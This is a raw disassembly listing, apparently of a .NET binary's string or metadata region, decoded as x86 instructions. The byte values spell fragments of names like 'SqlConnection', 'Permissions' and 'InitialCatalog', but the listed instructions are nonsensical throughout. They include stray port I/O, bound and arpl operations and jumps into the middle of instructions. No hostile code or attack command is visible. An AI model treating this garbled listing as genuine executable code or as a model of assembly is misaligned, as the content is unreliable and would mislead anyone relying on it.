  408a03:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  408a07:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  408a0f:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  408a16:	jae    0x408a8b
  408a18:	gs ins DWORD PTR es:[edi],dx
  408a1a:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  408a1e:	jb     0x408a81
  408a20:	fs gs ins DWORD PTR es:[edi],dx
  408a23:	popa   
  408a24:	jb     0x408a91
  408a26:	inc    ecx
  408a27:	je     0x408a9d
  408a29:	jb     0x408a94
  408a2b:	bound  esi,QWORD PTR [ebp+0x74]
  408a2e:	add    BYTE PTR gs:[ebx+0x79],dl
  408a32:	jae    0x408aa8
  408a34:	gs ins DWORD PTR es:[edi],dx
  408a36:	cs push ebx
  408a38:	arpl   WORD PTR gs:[ebp+0x72],si
  408a3c:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  408a44:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  408a4b:	add    BYTE PTR [ebx+0x65],dl
  408a4e:	arpl   WORD PTR [ebp+0x72],si
  408a51:	imul   esi,DWORD PTR [ecx+edi*2+0x50],0x696d7265
  408a59:	jae    0x408ace
  408a5b:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  408a62:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  408a69:	arpl   WORD PTR gs:[ebp+0x72],si
  408a6d:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x6f697463
  408a75:	outs   dx,BYTE PTR ds:[esi]
  408a76:	add    BYTE PTR [ebx+0x79],dl
  408a79:	jae    0x408aef
  408a7b:	gs ins DWORD PTR es:[edi],dx
  408a7d:	cs inc esp
  408a7f:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  408a86:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  408a8d:	jne    0x408af6
  408a8f:	addr16 popa 
  408a91:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  408a95:	je     0x408b0b
  408a97:	jb     0x408b02
  408a99:	bound  esi,QWORD PTR [ebp+0x74]
  408a9c:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  408aa1:	jne    0x408b0a
  408aa3:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  408aab:	jae    0x408aad
  408aad:	push   ebx
  408aae:	jns    0x408b23
  408ab0:	je     0x408b17
  408ab2:	ins    DWORD PTR es:[edi],dx
  408ab3:	cs push edx
  408ab5:	jne    0x408b25
  408ab7:	je     0x408b22
  408ab9:	ins    DWORD PTR es:[edi],dx
  408aba:	gs cs inc ebx
  408abd:	outs   dx,DWORD PTR ds:[esi]
  408abe:	ins    DWORD PTR es:[edi],dx
  408abf:	jo     0x408b2a
  408ac1:	ins    BYTE PTR es:[edi],dx
  408ac2:	gs jb  0x408b18
  408ac5:	gs jb  0x408b3e
  408ac8:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  408acf:	ins    DWORD PTR es:[edi],dx
  408ad0:	jo     0x408b3b
  408ad2:	ins    BYTE PTR es:[edi],dx
  408ad3:	popa   
  408ad4:	je     0x408b3f
  408ad6:	outs   dx,DWORD PTR ds:[esi]
  408ad7:	outs   dx,BYTE PTR ds:[esi]
  408ad8:	push   edx
  408ad9:	gs ins BYTE PTR es:[edi],dx
  408adb:	popa   
  408adc:	js     0x408b3f
  408ade:	je     0x408b49
  408ae0:	outs   dx,DWORD PTR ds:[esi]
  408ae1:	outs   dx,BYTE PTR ds:[esi]
  408ae2:	jae    0x408b25
  408ae4:	je     0x408b5a
  408ae6:	jb     0x408b51
  408ae8:	bound  esi,QWORD PTR [ebp+0x74]
  408aeb:	add    BYTE PTR gs:[edx+0x75],dl
  408aef:	outs   dx,BYTE PTR ds:[esi]
  408af0:	je     0x408b5b
  408af2:	ins    DWORD PTR es:[edi],dx
  408af3:	gs inc ebx
  408af5:	outs   dx,DWORD PTR ds:[esi]
  408af6:	ins    DWORD PTR es:[edi],dx
  408af7:	jo     0x408b5a
  408af9:	je     0x408b64
  408afb:	bound  ebp,QWORD PTR [ecx+0x6c]
  408afe:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  408b06:	bound  esi,QWORD PTR [ebp+0x74]
  408b09:	add    BYTE PTR gs:[ebx+0x73],dh
  408b0d:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  408b11:	outs   dx,BYTE PTR ds:[si]
  408b13:	outs   dx,DWORD PTR ds:[esi]
  408b14:	jae    0x408b7b
  408b16:	add    BYTE PTR [ebx+0x6f],al
  408b19:	outs   dx,BYTE PTR ds:[esi]
  408b1a:	jae    0x408b8b
  408b1c:	ins    BYTE PTR es:[edi],dx
  408b1d:	add    BYTE PTR gs:[ebx+0x79],dl
  408b21:	jae    0x408b97
  408b23:	gs ins DWORD PTR es:[edi],dx
  408b25:	cs dec ecx
  408b27:	dec    edi
  408b28:	add    BYTE PTR [ebp+eiz*2+0x78],dl
  408b2c:	je     0x408b85
  408b2e:	jb     0x408b99
  408b30:	je     0x408b97
  408b32:	jb     0x408b34
  408b34:	addr16 gs je 0x408b97
  408b38:	dec    edi
  408b39:	jne    0x408baf
  408b3b:	add    BYTE PTR [edi+0x72],dl
  408b3e:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  408b46:	pop    eax
  408b47:	ins    DWORD PTR es:[edi],dx
  408b48:	ins    BYTE PTR es:[edi],dx
  408b49:	push   esp
  408b4a:	gs js  0x408bc1
  408b4d:	push   edi
  408b4e:	jb     0x408bb9
  408b50:	je     0x408bb7
  408b52:	jb     0x408b54
  408b54:	push   edi
  408b55:	jb     0x408bc0
  408b57:	je     0x408bbe
  408b59:	push   ebx
  408b5a:	je     0x408bbd
  408b5c:	jb     0x408bd2
  408b5e:	inc    esp
  408b5f:	outs   dx,DWORD PTR ds:[esi]
  408b60:	arpl   WORD PTR [ebp+0x6d],si
  408b63:	outs   dx,BYTE PTR gs:[esi]
  408b65:	je     0x408b67
  408b67:	push   edi
  408b68:	jb     0x408bd3
  408b6a:	je     0x408bd1
  408b6c:	push   ebx
  408b6d:	je     0x408bd0
  408b6f:	jb     0x408be5
  408b71:	inc    ebp
  408b72:	ins    BYTE PTR es:[edi],dx
  408b73:	gs ins DWORD PTR es:[edi],dx
  408b75:	outs   dx,BYTE PTR gs:[esi]
  408b77:	je     0x408b79
  408b79:	push   edi
  408b7a:	jb     0x408be5
  408b7c:	je     0x408be3
  408b7e:	inc    ecx
  408b7f:	je     0x408bf5
  408b81:	jb     0x408bec
  408b83:	bound  esi,QWORD PTR [ebp+0x74]
  408b86:	gs push ebx
  408b88:	je     0x408bfc
  408b8a:	imul   ebp,DWORD PTR [esi+0x67],0x69725700
  408b91:	je     0x408bf8
  408b93:	inc    ebp
  408b94:	outs   dx,BYTE PTR ds:[esi]
  408b95:	fs inc ebp
  408b97:	ins    BYTE PTR es:[edi],dx
  408b98:	gs ins DWORD PTR es:[edi],dx
  408b9a:	outs   dx,BYTE PTR gs:[esi]
  408b9c:	je     0x408b9e
  408b9e:	inc    esp
  408b9f:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  408ba6:	imul   esp,DWORD PTR [ebx+0x73],0x6e657645
  408bad:	je     0x408bf7
  408baf:	popa   
  408bb0:	outs   dx,BYTE PTR ds:[esi]
  408bb1:	fs ins BYTE PTR es:[edi],dx
  408bb3:	gs jb  0x408bb6
  408bb6:	inc    ebp
  408bb7:	outs   dx,BYTE PTR ds:[esi]
  408bb8:	imul   ebp,DWORD PTR [bp+0x65],0x65736142
  408bc0:	add    BYTE PTR [ecx+0x64],ah
  408bc3:	fs pop edi
  408bc5:	dec    edi
  408bc6:	outs   dx,BYTE PTR ds:[esi]
  408bc7:	inc    esp
  408bc8:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  408bcf:	imul   esp,DWORD PTR [ebx+0x73],0x6e657645
  408bd6:	je     0x408bd8
  408bd8:	push   edx
  408bd9:	jne    0x408c49
  408bdb:	je     0x408c46
  408bdd:	ins    DWORD PTR es:[edi],dx
  408bde:	gs push esp
  408be0:	jns    0x408c52
  408be2:	gs dec eax
  408be4:	popa   
  408be5:	outs   dx,BYTE PTR ds:[esi]
  408be6:	fs ins BYTE PTR es:[edi],dx
  408be8:	add    BYTE PTR gs:[edi+0x65],al
  408bec:	je     0x408c42
  408bee:	jns    0x408c60
  408bf0:	gs inc esi
  408bf2:	jb     0x408c63
  408bf4:	ins    DWORD PTR es:[edi],dx
  408bf5:	dec    eax
  408bf6:	popa   
  408bf7:	outs   dx,BYTE PTR ds:[esi]
  408bf8:	fs ins BYTE PTR es:[edi],dx
  408bfa:	add    BYTE PTR gs:[ebp+0x76],al
  408bfe:	outs   dx,BYTE PTR gs:[esi]
  408c00:	je     0x408c4a
  408c02:	popa   
  408c03:	outs   dx,BYTE PTR ds:[esi]
  408c04:	fs ins BYTE PTR es:[edi],dx
  408c06:	gs jb  0x408c69
  408c09:	xor    DWORD PTR [eax],eax
  408c0b:	popa   
  408c0c:	fs fs pop edi
  408c0f:	dec    edi
  408c10:	outs   dx,BYTE PTR ds:[esi]
  408c11:	inc    ebp
  408c12:	outs   dx,BYTE PTR ds:[esi]
  408c13:	imul   ebp,DWORD PTR [bp+0x65],0x65637845
  408c1b:	jo     0x408c91
  408c1d:	imul   ebp,DWORD PTR [edi+0x6e],0x746e4900
  408c24:	xor    esi,DWORD PTR [edx]
  408c26:	add    BYTE PTR [ebp+0x78],al
  408c29:	arpl   WORD PTR [ebp+0x70],sp
  408c2c:	je     0x408c97
  408c2e:	outs   dx,DWORD PTR ds:[esi]
  408c2f:	outs   dx,BYTE PTR ds:[esi]
  408c30:	add    BYTE PTR [ebx+0x79],dl
  408c33:	jae    0x408ca9
  408c35:	gs ins DWORD PTR es:[edi],dx
  408c37:	cs inc ebx
  408c39:	outs   dx,DWORD PTR ds:[esi]
  408c3a:	ins    BYTE PTR es:[edi],dx
  408c3b:	ins    BYTE PTR es:[edi],dx
  408c3c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408c41:	outs   dx,BYTE PTR ds:[esi]
  408c42:	jae    0x408c44
  408c44:	dec    ecx
  408c45:	inc    esp
  408c46:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  408c4d:	jb     0x408cc8
  408c4f:	add    BYTE PTR [edi+0x65],ah
  408c52:	je     0x408cb3
  408c54:	inc    esp
  408c55:	popa   
  408c56:	je     0x408cb9
  408c58:	add    BYTE PTR [ebx+0x6f],al
  408c5b:	outs   dx,BYTE PTR ds:[esi]
  408c5c:	je     0x408cbf
  408c5e:	imul   ebp,DWORD PTR [esi+0x73],0x74656700
  408c65:	pop    edi
  408c66:	dec    ecx
  408c67:	je     0x408cce
  408c69:	ins    DWORD PTR es:[edi],dx
  408c6a:	add    BYTE PTR [ebx+0x74],dl
  408c6d:	jb     0x408cd8
  408c6f:	outs   dx,BYTE PTR ds:[esi]
  408c70:	add    BYTE PTR [bp+di+0x79],dl
  408c74:	jae    0x408cea
  408c76:	gs ins DWORD PTR es:[edi],dx
  408c78:	cs inc esp
  408c7a:	popa   
  408c7b:	je     0x408cde
  408c7d:	add    BYTE PTR [ebx+0x79],dl
  408c80:	jae    0x408cf6
  408c82:	gs ins DWORD PTR es:[edi],dx
  408c84:	cs inc esp
  408c86:	popa   
  408c87:	je     0x408cea
  408c89:	cs push ebx
  408c8b:	jno    0x408cf9
  408c8d:	inc    ebx
  408c8e:	ins    BYTE PTR es:[edi],dx
  408c8f:	imul   esp,DWORD PTR [ebp+0x6e],0x71530074
  408c96:	ins    BYTE PTR es:[edi],dx
  408c97:	inc    ebp
  408c98:	js     0x408cfd
  408c9a:	gs jo  0x408d11
  408c9d:	imul   ebp,DWORD PTR [edi+0x6e],0x6c715300
  408ca4:	inc    ebp
  408ca5:	jb     0x408d19
  408ca7:	outs   dx,DWORD PTR ds:[esi]
  408ca8:	jb     0x408ced
  408caa:	outs   dx,DWORD PTR ds:[esi]
  408cab:	ins    BYTE PTR es:[edi],dx
  408cac:	ins    BYTE PTR es:[edi],dx
  408cad:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408cb2:	outs   dx,BYTE PTR ds:[esi]
  408cb3:	add    BYTE PTR [edi+0x65],ah
  408cb6:	je     0x408d17
  408cb8:	inc    ebp
  408cb9:	jb     0x408d2d
  408cbb:	outs   dx,DWORD PTR ds:[esi]
  408cbc:	jb     0x408d31
  408cbe:	add    BYTE PTR [ecx+0x45],cl
  408cc1:	outs   dx,BYTE PTR ds:[esi]
  408cc2:	jne    0x408d31
  408cc4:	gs jb  0x408d28
  408cc7:	je     0x408d38
  408cc9:	jb     0x408ccb
  408ccb:	inc    edi
  408ccc:	gs je  0x408d14
  408ccf:	outs   dx,BYTE PTR ds:[esi]
  408cd0:	jne    0x408d3f
  408cd2:	gs jb  0x408d36
  408cd5:	je     0x408d46
  408cd7:	jb     0x408cd9
  408cd9:	addr16 gs je 0x408d3c
  408cdd:	inc    ebx
  408cde:	jne    0x408d52
  408ce0:	jb     0x408d47
  408ce2:	outs   dx,BYTE PTR ds:[esi]
  408ce3:	je     0x408ce5
  408ce5:	push   ebx
  408ce6:	jno    0x408d54
  408ce8:	inc    ebp
  408ce9:	jb     0x408d5d
  408ceb:	outs   dx,DWORD PTR ds:[esi]
  408cec:	jb     0x408cee
  408cee:	addr16 gs je 0x408d51
  408cf2:	inc    ebp
  408cf3:	jb     0x408d67
  408cf5:	outs   dx,DWORD PTR ds:[esi]
  408cf6:	jb     0x408cf8
  408cf8:	addr16 gs je 0x408d5b
  408cfc:	dec    ebp
  408cfd:	gs jae 0x408d73
  408d00:	popa   
  408d01:	add    BYTE PTR gs:[di+0x6f],cl
  408d06:	jbe    0x408d6d
  408d08:	dec    esi
  408d09:	gs js  0x408d80
  408d0c:	add    BYTE PTR [ecx+0x44],cl
  408d0f:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  408d16:	ins    BYTE PTR es:[edi],dx
  408d17:	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  408d1c:	jo     0x408d8d
  408d1e:	jae    0x408d85
  408d20:	add    BYTE PTR [edi+0x72],dl
  408d23:	imul   esi,DWORD PTR [ebp+eiz*2+0x45],0x6f44646e
  408d2b:	arpl   WORD PTR [ebp+0x6d],si
  408d2e:	outs   dx,BYTE PTR gs:[esi]
  408d30:	je     0x408d32
  408d32:	inc    esi
  408d33:	ins    BYTE PTR es:[edi],dx
  408d34:	jne    0x408da9
  408d36:	push   0x766e4500
  408d3b:	imul   esi,DWORD PTR [edx+0x6f],0x6e656d6e
  408d42:	je     0x408d44
  408d44:	inc    ebp
  408d45:	js     0x408db0
  408d47:	je     0x408d49
  408d49:	imul   esp,DWORD PTR fs:[ecx+0x67],0x74736f6e
  408d51:	imul   esp,DWORD PTR [ebx+0x73],0x6e75522e
  408d58:	je     0x408dc3
  408d5a:	ins    DWORD PTR es:[edi],dx
  408d5b:	add    BYTE PTR gs:[ebp+0x6f],cl
  408d5f:	outs   dx,BYTE PTR ds:[esi]
  408d60:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x74657300
  408d68:	pop    edi
  408d69:	inc    esi
  408d6a:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x49646572
  408d72:	inc    esp
  408d73:	push   ebx
  408d74:	add    BYTE PTR [ebx+0x65],dh
  408d77:	je     0x408dd8
  408d79:	inc    ecx
  408d7a:	fs fs dec esi
  408d7d:	gs ja  0x408dc9
  408d80:	inc    esp
  408d81:	push   ebx
  408d82:	add    BYTE PTR [edi+0x65],ah
  408d85:	je     0x408de6
  408d87:	inc    ebx
  408d88:	outs   dx,DWORD PTR ds:[esi]
  408d89:	jne    0x408df9
  408d8b:	je     0x408d8d
  408d8d:	inc    ecx
  408d8e:	fs add BYTE PTR fs:[ebp+0x6e],al
  408d93:	jne    0x408e02
  408d95:	gs jb  0x408df9
  408d98:	je     0x408e09
  408d9a:	jb     0x408d9c
  408d9c:	dec    ebp
  408d9d:	outs   dx,DWORD PTR ds:[esi]
  408d9e:	outs   dx,BYTE PTR ds:[esi]
  408d9f:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x76726553
  408da7:	gs jb  0x408daa
  408daa:	dec    ebp
  408dab:	popa   
  408dac:	js     0x408e04
  408dae:	popa   
  408daf:	ins    BYTE PTR es:[edi],dx
  408db0:	jne    0x408e17
  408db2:	add    BYTE PTR [ebx+0x6f],al
  408db5:	outs   dx,BYTE PTR ds:[esi]
  408db6:	je     0x408e1d
  408db8:	js     0x408e2e
  408dba:	add    BYTE PTR [edi+0x65],ah
  408dbd:	je     0x408e1e
  408dbf:	inc    ebx
  408dc0:	outs   dx,DWORD PTR ds:[esi]
  408dc1:	outs   dx,BYTE PTR ds:[esi]
  408dc2:	je     0x408e29
  408dc4:	js     0x408e3a
  408dc6:	add    BYTE PTR [ecx+0x43],cl
  408dc9:	outs   dx,DWORD PTR ds:[esi]
  408dca:	outs   dx,BYTE PTR ds:[esi]
  408dcb:	je     0x408e32
  408dcd:	js     0x408e43
  408dcf:	add    BYTE PTR [edx+0x75],dl
  408dd2:	outs   dx,BYTE PTR ds:[esi]
  408dd3:	inc    ebx
  408dd4:	push   0x736b6365
  408dd9:	add    BYTE PTR [ebx+0x68],dl
  408ddc:	jne    0x408e52
  408dde:	outs   dx,DWORD PTR fs:[esi]
  408de0:	ja     0x408e50
  408de2:	add    BYTE PTR [ecx+ebp*2+0x61],al
  408de6:	ins    BYTE PTR es:[edi],dx
  408de7:	outs   dx,DWORD PTR ds:[esi]
  408de8:	addr16 push ebx
  408dea:	arpl   WORD PTR gs:[ebp+0x72],si
  408dee:	imul   esi,DWORD PTR [ecx+edi*2+0x54],0x73657079
  408df6:	add    BYTE PTR [ecx+0x72],al
  408df9:	addr16 jne 0x408e69
  408dfc:	outs   dx,BYTE PTR gs:[esi]
  408dfe:	je     0x408e45
  408e00:	js     0x408e65
  408e02:	gs jo  0x408e79
  408e05:	imul   ebp,DWORD PTR [edi+0x6e],0x6e6f4300
  408e0c:	jbe    0x408e73
  408e0e:	jb     0x408e83
  408e10:	popa   
  408e11:	je     0x408e7c
  408e13:	outs   dx,DWORD PTR ds:[esi]
  408e14:	outs   dx,BYTE PTR ds:[esi]
  408e15:	dec    ecx
  408e16:	outs   dx,BYTE PTR ds:[esi]
  408e17:	outs   dx,WORD PTR ds:[esi]
  408e19:	add    BYTE PTR [ebx+0x65],dh
  408e1c:	je     0x408e7d
  408e1e:	inc    esi
  408e1f:	jb     0x408e90
  408e21:	ins    DWORD PTR es:[edi],dx
  408e22:	push   ebx
  408e23:	gs jb  0x408e9c
  408e26:	gs jb  0x408e29
  408e29:	jae    0x408e90
  408e2b:	je     0x408e8c
  408e2d:	inc    esi
  408e2e:	jb     0x408e9f
  408e30:	ins    DWORD PTR es:[edi],dx
  408e31:	inc    esp
  408e32:	popa   
  408e33:	je     0x408e96
  408e35:	bound  esp,QWORD PTR [ecx+0x73]
  408e38:	add    BYTE PTR gs:[ebx+0x65],dh
  408e3c:	je     0x408e9d
  408e3e:	inc    esi
  408e3f:	jb     0x408eb0
  408e41:	ins    DWORD PTR es:[edi],dx
  408e42:	push   ebx
  408e43:	gs jb  0x408ebc
  408e46:	imul   esp,DWORD PTR [ebx+0x65],0x74657300
  408e4d:	pop    edi
  408e4e:	push   esp
  408e4f:	outs   dx,DWORD PTR ds:[esi]
  408e50:	push   ebx
  408e51:	gs jb  0x408eca
  408e54:	gs jb  0x408e57
  408e57:	jae    0x408ebe
  408e59:	je     0x408eba
  408e5b:	push   esp
  408e5c:	outs   dx,DWORD PTR ds:[esi]
  408e5d:	inc    esp
  408e5e:	popa   
  408e5f:	je     0x408ec2
  408e61:	bound  esp,QWORD PTR [ecx+0x73]
  408e64:	add    BYTE PTR gs:[ebx+0x65],dh
  408e68:	je     0x408ec9
  408e6a:	push   esp
  408e6b:	outs   dx,DWORD PTR ds:[esi]
  408e6c:	push   ebx
  408e6d:	gs jb  0x408ee6
  408e70:	imul   esp,DWORD PTR [ebx+0x65],0x74657300
  408e77:	pop    edi
  408e78:	dec    edi
  408e79:	outs   dx,BYTE PTR ds:[esi]
  408e7a:	inc    ebx
  408e7b:	outs   dx,DWORD PTR ds:[esi]
  408e7c:	outs   dx,BYTE PTR ds:[esi]
  408e7d:	je     0x408ef1
  408e7f:	popa   
  408e80:	arpl   WORD PTR [eax+eax*1+0x73],si
  408e84:	gs je  0x408ee6
  408e87:	push   esp
  408e88:	outs   dx,DWORD PTR ds:[esi]
  408e89:	inc    edx
  408e8a:	jb     0x408efb
  408e8c:	imul   esp,DWORD PTR [ebp+0x72],0x49
  408e90:	outs   dx,BYTE PTR ds:[esi]
  408e91:	jae    0x408f07
  408e93:	popa   
  408e94:	outs   dx,BYTE PTR ds:[esi]
  408e95:	arpl   WORD PTR [ebp+0x0],sp
  408e98:	jae    0x408eff
  408e9a:	je     0x408efb
  408e9c:	push   ebx
  408e9d:	arpl   WORD PTR gs:[ebp+0x72],si
  408ea1:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x5f746573
  408ea9:	inc    esi
  408eaa:	jb     0x408f1b
  408eac:	ins    DWORD PTR es:[edi],dx
  408ead:	push   ebx
  408eae:	gs jb  0x408f27
  408eb1:	gs jb  0x408f01
  408eb4:	imul   esi,DWORD PTR [edx+0x72],0x7300726f
  408ebb:	gs je  0x408f1d
  408ebe:	push   esp
  408ebf:	outs   dx,DWORD PTR ds:[esi]
  408ec0:	push   ebx
  408ec1:	gs jb  0x408f3a
  408ec4:	gs jb  0x408f14
  408ec7:	imul   esi,DWORD PTR [edx+0x72],0x4300726f
  408ece:	push   0x446b6365
  408ed3:	imul   esp,DWORD PTR [ecx+0x6c],0x5300676f
  408eda:	jno    0x408f48
  408edc:	inc    ebx
  408edd:	outs   dx,DWORD PTR ds:[esi]
  408ede:	outs   dx,BYTE PTR ds:[esi]
  408edf:	outs   dx,BYTE PTR ds:[esi]
  408ee0:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408ee5:	outs   dx,BYTE PTR ds:[esi]
  408ee6:	push   ebx
  408ee7:	je     0x408f5b
  408ee9:	imul   ebp,DWORD PTR [esi+0x67],0x6c697542
  408ef0:	fs gs jb 0x408ef4
  408ef4:	jae    0x408f5b
  408ef6:	je     0x408f57
  408ef8:	inc    ecx
  408ef9:	jo     0x408f6b
  408efb:	ins    BYTE PTR es:[edi],dx
  408efc:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  408f03:	dec    esi
  408f04:	popa   
  408f05:	ins    DWORD PTR es:[edi],dx
  408f06:	add    BYTE PTR gs:[edi+0x65],ah
  408f0a:	je     0x408f6b
  408f0c:	dec    ecx
  408f0d:	outs   dx,BYTE PTR ds:[esi]
  408f0e:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x7461436c
  408f16:	popa   
  408f17:	ins    BYTE PTR es:[edi],dx
  408f18:	outs   dx,DWORD PTR ds:[esi]
  408f19:	add    BYTE PTR [bp+di+0x65],dh
  408f1d:	je     0x408f7e
  408f1f:	dec    ecx
  408f20:	outs   dx,BYTE PTR ds:[esi]
  408f21:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x7461436c
  408f29:	popa   
  408f2a:	ins    BYTE PTR es:[edi],dx
  408f2b:	outs   dx,DWORD PTR ds:[esi]
  408f2c:	add    BYTE PTR [bp+di+0x79],dl
  408f30:	jae    0x408fa6
  408f32:	gs ins DWORD PTR es:[edi],dx
  408f34:	cs inc esp
  408f36:	popa   
  408f37:	je     0x408f9a
  408f39:	cs inc ebx
  408f3b:	outs   dx,DWORD PTR ds:[esi]
  408f3c:	ins    DWORD PTR es:[edi],dx
  408f3d:	ins    DWORD PTR es:[edi],dx
  408f3e:	outs   dx,DWORD PTR ds:[esi]
  408f3f:	outs   dx,BYTE PTR ds:[esi]
  408f40:	add    BYTE PTR [edx+eiz*2+0x43],al
  408f44:	outs   dx,DWORD PTR ds:[esi]
  408f45:	outs   dx,BYTE PTR ds:[esi]
  408f46:	outs   dx,BYTE PTR ds:[esi]
  408f47:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408f4c:	outs   dx,BYTE PTR ds:[esi]
  408f4d:	push   ebx
  408f4e:	je     0x408fc2
  408f50:	imul   ebp,DWORD PTR [esi+0x67],0x6c697542
  408f57:	fs gs jb 0x408f5b
  408f5b:	addr16 gs je 0x408fbe
  408f5f:	inc    ebx
  408f60:	outs   dx,DWORD PTR ds:[esi]
  408f61:	outs   dx,BYTE PTR ds:[esi]
  408f62:	outs   dx,BYTE PTR ds:[esi]
  408f63:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408f68:	outs   dx,BYTE PTR ds:[esi]
  408f69:	push   ebx
  408f6a:	je     0x408fde
  408f6c:	imul   ebp,DWORD PTR [esi+0x67],0x6c715300
  408f73:	inc    ebx
  408f74:	outs   dx,DWORD PTR ds:[esi]
  408f75:	outs   dx,BYTE PTR ds:[esi]
  408f76:	outs   dx,BYTE PTR ds:[esi]
  408f77:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408f7c:	outs   dx,BYTE PTR ds:[esi]
  408f7d:	add    BYTE PTR [edx+eiz*2+0x43],al
  408f81:	outs   dx,DWORD PTR ds:[esi]
  408f82:	outs   dx,BYTE PTR ds:[esi]
  408f83:	outs   dx,BYTE PTR ds:[esi]
  408f84:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408f89:	outs   dx,BYTE PTR ds:[esi]
  408f8a:	add    BYTE PTR [edi+0x70],cl
  408f8d:	outs   dx,BYTE PTR gs:[esi]
  408f8f:	add    BYTE PTR [edi+0x65],ah
  408f92:	je     0x408ff3
  408f94:	inc    esp
  408f95:	popa   
  408f96:	je     0x408ff9
  408f98:	push   ebx
  408f99:	outs   dx,DWORD PTR ds:[esi]
  408f9a:	jne    0x40900e
  408f9c:	arpl   WORD PTR [ebp+0x0],sp
  408f9f:	jae    0x409006
  408fa1:	je     0x409002
  408fa3:	dec    ecx
  408fa4:	je     0x40900b
  408fa6:	ins    DWORD PTR es:[edi],dx
  408fa7:	add    BYTE PTR [edi+0x70],ch
  408faa:	pop    edi
  408fab:	inc    ebp
  408fac:	jno    0x409023
  408fae:	popa   
  408faf:	ins    BYTE PTR es:[edi],dx
  408fb0:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x7263694d
  408fb8:	outs   dx,DWORD PTR ds:[esi]
  408fb9:	jae    0x40902a
  408fbb:	data16 je 0x408fec
  408fbe:	push   ebx
  408fbf:	jno    0x40902d
  408fc1:	push   ebx
  408fc2:	gs jb  0x40903b
  408fc5:	gs jb  0x408ff6
  408fc8:	inc    ebx
  408fc9:	outs   dx,DWORD PTR ds:[esi]
  408fca:	outs   dx,BYTE PTR ds:[esi]
  408fcb:	outs   dx,BYTE PTR ds:[esi]
  408fcc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408fd1:	outs   dx,BYTE PTR ds:[esi]
  408fd2:	dec    ecx
  408fd3:	outs   dx,BYTE PTR ds:[esi]
  408fd4:	outs   dx,WORD PTR ds:[esi]
  408fd6:	add    BYTE PTR [ebp+0x69],cl
  408fd9:	arpl   WORD PTR [edx+0x6f],si
  408fdc:	jae    0x40904d
  408fde:	data16 je 0x40900f
  408fe1:	push   ebx
  408fe2:	jno    0x409050
  408fe4:	push   ebx
  408fe5:	gs jb  0x40905e
  408fe8:	gs jb  0x409019
  408feb:	dec    ebp
  408fec:	popa   
  408fed:	outs   dx,BYTE PTR ds:[esi]
  408fee:	popa   
  408fef:	gs ins DWORD PTR es:[di],dx
  408ff2:	outs   dx,BYTE PTR gs:[esi]
  408ff4:	je     0x409024
  408ff6:	inc    ebx
  408ff7:	outs   dx,DWORD PTR ds:[esi]
  408ff8:	ins    DWORD PTR es:[edi],dx
  408ff9:	ins    DWORD PTR es:[edi],dx
  408ffa:	outs   dx,DWORD PTR ds:[esi]
  408ffb:	outs   dx,BYTE PTR ds:[esi]
  408ffc:	add    BYTE PTR [ebx+0x65],dl
  408fff:	jb     0x409077
  409001:	gs jb  0x409047
  409004:	outs   dx,DWORD PTR ds:[esi]
  409005:	outs   dx,BYTE PTR ds:[esi]
  409006:	outs   dx,BYTE PTR ds:[esi]
  409007:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40900c:	outs   dx,BYTE PTR ds:[esi]
  40900d:	add    BYTE PTR [ebp+0x69],cl
  409010:	arpl   WORD PTR [edx+0x6f],si
  409013:	jae    0x409084
  409015:	data16 je 0x409046
  409018:	push   ebx
  409019:	jno    0x409087
  40901b:	push   ebx
  40901c:	gs jb  0x409095
  40901f:	gs jb  0x409050
  409022:	push   ebx
  409023:	ins    DWORD PTR es:[edi],dx
  409024:	outs   dx,DWORD PTR ds:[esi]
  409025:	add    BYTE PTR [ebp+0x69],cl
  409028:	arpl   WORD PTR [edx+0x6f],si
  40902b:	jae    0x40909c
  40902d:	data16 je 0x40905e
  409030:	push   ebx
  409031:	jno    0x40909f
  409033:	push   ebx
  409034:	gs jb  0x4090ad
  409037:	gs jb  0x409068
  40903a:	dec    ebp
  40903b:	popa   
  40903c:	outs   dx,BYTE PTR ds:[esi]
  40903d:	popa   
  40903e:	gs ins DWORD PTR es:[di],dx
  409041:	outs   dx,BYTE PTR gs:[esi]
  409043:	je     0x409073
  409045:	push   ebx
  409046:	ins    DWORD PTR es:[edi],dx
  409047:	outs   dx,DWORD PTR ds:[esi]
  409048:	add    BYTE PTR [edi+0x65],ah
  40904b:	je     0x4090ac
  40904d:	dec    esi
